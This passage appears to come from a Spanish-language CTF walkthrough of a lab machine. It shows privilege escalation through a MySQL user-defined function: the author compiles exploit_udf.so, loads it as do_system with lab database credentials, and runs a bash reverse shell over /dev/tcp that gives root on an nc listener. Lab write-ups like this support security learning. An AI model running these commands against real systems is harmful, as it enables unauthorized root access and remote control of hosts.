designer@0749e50021a5:/tmp$ gcc -g -c exploit_udf.c

designer@0749e50021a5:/tmp$ gcc -g -shared -Wl,-soname,exploit_udf.so -o exploit_udf.so exploit_udf.o -lc 

designer@0749e50021a5:/tmp$ ls
exploit_udf.c  exploit_udf.o  exploit_udf.so
~~~

Movemos la librería al directorio donde se almacenan los `plugins` para que `msyql` pueda cargarla

~~~ bash
designer@0749e50021a5:/tmp$ mv exploit_udf.so /usr/lib/mysql/plugin/
~~~

Ahora nos conectamos a `mysql` y creamos una función que haga referencia a la librería que hemos agregado **(mismo nombre del archivo)** usando la base de datos `mysql`

~~~ bash
designer@0749e50021a5:/tmp$ mysql -u admin -p'PassAdmin123-'
MariaDB [(none)]> use mysql;

MariaDB [(none)]> CREATE FUNCTION do_system RETURNS STRING SONAME 'exploit_udf.so';
Query OK, 0 rows affected (0.002 sec)
~~~


## Root Time - Shell as `root`

En este punto podemos ejecutar la función y enviarle un comando, este se ejecutará a nivel de sistema, en mi caso enviaré una shell a mi puerto `443`

~~~ bash
MariaDB [mysql]> SELECT do_system('/bin/bash -c "/bin/bash -i >& /dev/tcp/172.17.0.1/443 0>&1"');
~~~

> `Atacante`

~~~ bash
nc -lvnp 443
listening on [any] 443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 58160
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@0749e50021a5:/var/lib/mysql\# id
id
uid=0(root) gid=0(root) groups=0(root)
root@0749e50021a5:/var/lib/mysql\# 
~~~


